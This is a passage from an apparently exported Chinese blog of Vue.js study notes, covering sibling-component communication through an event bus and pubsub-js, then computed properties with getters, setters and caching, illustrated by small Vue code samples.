<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>兄弟组件通信 Child-2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>Child-2 姓名：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>Child-2 年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sendData&quot;</span>&gt;</span>点我向Child-1发送数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>: <span class="string">&quot;Child2&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">name</span>: <span class="string">&quot;Child-2&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">age</span>: <span class="number">20</span></span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">sendData</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 触发事件</span></span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">this</span>.<span class="property">$bus</span>.$emit(<span class="string">&quot;my-event&quot;</span>, <span class="variable language_">this</span>.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong><code>src/App.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;Vue logo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/logo.png&quot;</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">Child1</span>&gt;</span><span class="tag">&lt;/<span class="name">Child1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Child2</span>&gt;</span><span class="tag">&lt;/<span class="name">Child2</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Child1</span>  <span class="keyword">from</span> <span class="string">&quot;./components/Child1&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Child2</span> <span class="keyword">from</span> <span class="string">&quot;./components/Child2&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title class_">Child1</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title class_">Child2</span>,</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815145043.png" alt="  "></p>
<hr>
<hr>
<h1 id="四、消息订阅与发布"><a href="#四、消息订阅与发布" class="headerlink" title="四、消息订阅与发布"></a>四、消息订阅与发布</h1><p><strong>消息订阅与发布（pubsub）：</strong></p>
<ul>
<li>消息订阅与发布是一种组件间通信的方式，适用于任意组件间通信</li>
</ul>
<p><strong>使用步骤：</strong></p>
<ul>
<li>安装 <code>pubsub-js</code></li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">npm i pubsub-js</span><br></pre></td></tr></table></figure>

<ul>
<li>引入</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pubsub <span class="keyword">from</span> <span class="string">&#x27;pubsub-js&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">	<span class="title function_">methods</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="comment">// 定义回调函数</span></span><br><span class="line">		<span class="title function_">rollbackFunc</span>(<span class="params">msgName, data</span>)&#123;...&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	<span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="variable language_">this</span>.<span class="property">pid</span> = pubsub.<span class="title function_">subscribe</span>(<span class="string">&#x27;xxx&#x27;</span>, <span class="variable language_">this</span>.<span class="property">rollbackFunc</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<ul>
<li>提供数据</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pubsub.<span class="title function_">publish</span>(<span class="string">&#x27;xxx&#x27;</span>, data)</span><br></pre></td></tr></table></figure>

<ul>
<li>取消订阅</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pubsub.<span class="title function_">unsubscribe</span>(pid)</span><br></pre></td></tr></table></figure>

<p><strong>测试案例：</strong></p>
<p><strong><code>src/components/Child1.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>兄弟组件通信 Child-1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>Child-1 姓名：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>Child-1 年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>: <span class="string">&quot;Child&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">name</span>: <span class="string">&quot;Child-1&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">age</span>: <span class="number">10</span></span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">demo</span>(<span class="params">msgName, data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我是 Child-1 组件，我收到的数据 = &quot;</span>, data);</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;其中 msgName = &quot;</span>, msgName)</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 当页面挂载完毕 Child1 组件订阅消息</span></span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;订阅消息&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">this</span>.<span class="property">pid</span> = pubsub.<span class="title function_">subscribe</span>(<span class="string">&quot;my-event&quot;</span>, <span class="variable language_">this</span>.<span class="property">demo</span>)</span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">beforeDestroy</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">//取消订阅</span></span></span><br><span class="line"><span class="language-javascript">		pubsub.<span class="title function_">unsubscribe</span>(<span class="variable language_">this</span>.<span class="property">pid</span> ) </span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong><code>src/components/Child2.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>兄弟组件通信 Child-2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>Child-2 姓名：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>Child-2 年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sendData&quot;</span>&gt;</span>点我向Child-1发送数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>: <span class="string">&quot;Child2&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">name</span>: <span class="string">&quot;Child-2&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">age</span>: <span class="number">20</span></span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">sendData</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 发布消息</span></span></span><br><span class="line"><span class="language-javascript">			pubsub.<span class="title function_">publish</span>(<span class="string">&quot;my-event&quot;</span>, <span class="variable language_">this</span>.<span class="property">name</span>)</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong><code>src/App.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;Vue logo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/logo.png&quot;</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">Child1</span>&gt;</span><span class="tag">&lt;/<span class="name">Child1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Child2</span>&gt;</span><span class="tag">&lt;/<span class="name">Child2</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Child1</span>  <span class="keyword">from</span> <span class="string">&quot;./components/Child1&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Child2</span> <span class="keyword">from</span> <span class="string">&quot;./components/Child2&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title class_">Child1</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title class_">Child2</span>,</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815145048.png" alt="  "></p>
<hr>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>vue</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue框架总结（二、Vue计算属性与监听属性）</title>
    <url>/posts/b634f675.html</url>
    <content><![CDATA[<h1 id="一、计算属性"><a href="#一、计算属性" class="headerlink" title="一、计算属性"></a>一、计算属性</h1><h2 id="1-案例引入"><a href="#1-案例引入" class="headerlink" title="1. 案例引入"></a>1. 案例引入</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>计算属性<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--只取姓的前 3 位--&gt;</span></span><br><span class="line">        姓名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;firstName&#125;&#125; - &#123;&#123;lastName.slice(0, 3)&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>, </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">data</span>:&#123; </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">firstName</span>:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">lastName</span>:<span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>上述案例中需要输入姓与名，然后输出名的前 3 位，最先想到的就是直接在插值语法中使用 slice 函数。<br>但这样就违背了官网“模板表达式便利”的前提，如下图：</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144626.png" alt="  "></p>
<hr>
<h2 id="2-计算属性使用"><a href="#2-计算属性使用" class="headerlink" title="2. 计算属性使用"></a>2. 计算属性使用</h2><p><strong>计算属性完整语法：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>:&#123;</span><br><span class="line">	计算属性名:&#123;</span><br><span class="line">		<span class="comment">// 返回值作为 计算属性名的值</span></span><br><span class="line">		<span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">		&#125;,</span><br><span class="line">		<span class="title function_">set</span>(<span class="params">value</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>计算属性案例引入<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">		姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--只取姓的前 3 位--&gt;</span></span><br><span class="line">		姓名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>, </span></span><br><span class="line"><span class="language-javascript">			<span class="attr">data</span>:&#123; </span></span><br><span class="line"><span class="language-javascript">				<span class="attr">firstName</span>:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">lastName</span>:<span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">			&#125;,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">computed</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">fullName</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="comment">// 返回值作为 fullName 的值</span></span></span><br><span class="line"><span class="language-javascript">					<span class="title function_">get</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">						<span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">					&#125;,</span></span><br><span class="line"><span class="language-javascript">					<span class="title function_">set</span>(<span class="params">value</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">						<span class="keyword">const</span> arr = value.<span class="title function_">split</span>(<span class="string">&#x27;-&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">						<span class="variable language_">this</span>.<span class="property">firstName</span> = arr[<span class="number">0</span>]</span></span><br><span class="line"><span class="language-javascript">						<span class="variable language_">this</span>.<span class="property">lastName</span> = arr[<span class="number">1</span>]</span></span><br><span class="line"><span class="language-javascript">					&#125;</span></span><br><span class="line"><span class="language-javascript">				&#125;</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;)</span></span><br><span class="line"><span class="language-javascript">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>







<p><strong>注意：</strong></p>
<ul>
<li>计算属性与data属性都是Vue中属性，不能重名，用法相同</li>
<li>计算属性通过已有属性计算得来</li>
<li>如果计算属性要被修改，那必须写<code>set</code>函数去响应修改，且set中要引起计算时依赖的数据发生改变</li>
</ul>
<hr>
<p><strong>get函数执行时机</strong></p>
<ul>
<li>初次读取时会执行一次</li>
<li>当依赖的数据发生改变时会被再次调用</li>
</ul>
<hr>
<h2 id="3-计算属性缓存"><a href="#3-计算属性缓存" class="headerlink" title="3. 计算属性缓存"></a>3. 计算属性缓存</h2><blockquote>
<p><strong>计算属性是基于它们的依赖项的值进行缓存的，只要依赖项的值不变，除第一次读取外，均是从缓存读取值。</strong></p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>计算属性案例引入<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>, </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">			<span class="attr">computed</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">name</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="title function_">get</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">						<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;get...&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">						<span class="keyword">return</span> <span class="string">&quot;划水艺术家&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">					&#125;,</span></span><br><span class="line"><span class="language-javascript">					<span class="title function_">set</span>(<span class="params">value</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">						</span></span><br><span class="line"><span class="language-javascript">					&#125;</span></span><br><span class="line"><span class="language-javascript">				&#125;</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;)</span></span><br><span class="line"><span class="language-javascript">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144634.png" alt="  "></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144638.png" alt="  "></p>
<blockquote>
<p><strong>计算属性根据依赖项的值缓存，依赖项的值变化后重新存入缓存，比普通方法性能更高</strong></p>
</blockquote>
<hr>
